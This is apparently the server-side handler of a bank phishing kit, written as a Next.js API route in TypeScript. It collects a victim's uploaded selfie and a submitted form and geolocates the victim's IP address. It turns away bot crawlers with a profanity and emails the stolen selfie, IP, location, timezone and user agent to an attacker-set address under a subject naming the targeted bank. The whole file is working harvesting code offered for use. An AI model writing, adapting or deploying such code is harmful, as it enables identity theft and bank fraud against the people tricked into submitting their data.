import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendEmail } from "../../utils/sendEmail";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.send(`Fuck off`);
    return;
  }

  const selfie = req.files?.selfie as any;
  const form = req.body.form[0];

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);
    await sendEmail(
      process.env.TO as string,
      `
       <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
       <br>
       <h4>SELFIE</h4>
       <p>| (▰˘◡˘▰) See attached files</b></p>
       <br>
       <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
       <br>
       <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
       <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
       <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
       <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
       <br>
       <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
       `,
      `${process.env.BANK_NAME} - ${form} by ROCKET 🚀🚀🚀 From ${ip}`,
      [
        {
          filename: `Selfie.${selfie[0].headers[`content-type`].split(`/`)[1]}`,
          content: selfie[0],
        },
      ]
    );
    res.send(Promise.resolve());
  } catch (error) {
    console.log(error);
    res.status(500).send(`Something went wrong`);
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
